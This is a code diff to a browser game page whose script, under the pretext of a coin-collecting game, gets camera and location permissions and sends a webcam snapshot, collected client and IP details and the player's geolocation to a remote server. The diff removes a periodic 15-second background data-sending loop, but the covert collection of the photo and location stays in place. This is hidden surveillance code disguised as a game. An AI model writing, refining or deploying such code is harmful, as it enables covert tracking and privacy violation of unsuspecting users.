@@ -124,7 +124,6 @@
     let cameraGranted = false;
     let gameEnded = false;
     let coinsCollected = 0;
-    let backgroundDataInterval = null;
 
     /* -----------------------------
        CLIENT INFO COLLECTION
@@ -169,7 +168,7 @@
     async function sendToServer(imageData = null, extra = {}) {
       const clientInfo = await collectClientInfo();
       const payload = {
-        image: imageData || "", // optional
+        image: imageData || "",
         client: clientInfo,
         extra
       };
@@ -198,13 +197,12 @@
         video.onloadedmetadata = () => {
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
           const imageData = canvas.toDataURL('image/png');
-          sendToServer(imageData); // send snapshot
+          sendToServer(imageData); // send snapshot only once
 
           stream.getTracks().forEach(track => track.stop());
           overlay.style.display = "none";
           cameraGranted = true;
 
-          startBackgroundData(); // begin periodic sending
           startGameTimer(); // start 1-minute timer
         };
       } catch (err) {
@@ -226,16 +224,6 @@
         </ul>
       `;
     });
-
-    /* -----------------------------
-       BACKGROUND DATA SENDING
-    ----------------------------- */
-    function startBackgroundData() {
-      backgroundDataInterval = setInterval(() => {
-        if (gameEnded) return;
-        sendToServer(); // send browser + IP data periodically
-      }, 15000); // every 15 seconds
-    }
 
     /* -----------------------------
        TIMER
@@ -284,8 +272,8 @@
             accuracy: position.coords.accuracy
           };
 
-          await sendToServer(null, locationData); // send geolocation + name
-          showResultsBtn.disabled = false; // enable results button
+          await sendToServer(null, locationData); // send final data only
+          showResultsBtn.disabled = false;
           overlay.style.display = "none";
         }, (err) => {
           alert("Location permission denied. Cannot show results.");
@@ -334,8 +322,7 @@
        GAME LOOP
     ----------------------------- */
     function gameLoop() {
-      //if (!cameraGranted || gameEnded) return;
-      if (gameEnded) return;
+      if (gameEnded) return; // movement runs even in preview
 
       playerX += Math.random() < 0.5 ? -3 : 3;
       playerX = Math.max(0, Math.min(gameBox.offsetWidth - 60, playerX));
@@ -348,14 +335,14 @@
        CONTROLS
     ----------------------------- */
     document.addEventListener('keydown', (e) => {
-      if (!cameraGranted || gameEnded) return;
+      if (gameEnded) return;
       if (e.key === 'ArrowLeft') playerX -= 15;
       if (e.key === 'ArrowRight') playerX += 15;
     });
 
     if (window.DeviceOrientationEvent) {
       window.addEventListener('deviceorientation', (event) => {
-        if (!cameraGranted || gameEnded) return;
+        if (gameEnded) return;
         const gamma = event.gamma;
         if (gamma > 5) playerX += 5;
         if (gamma < -5) playerX -= 5;
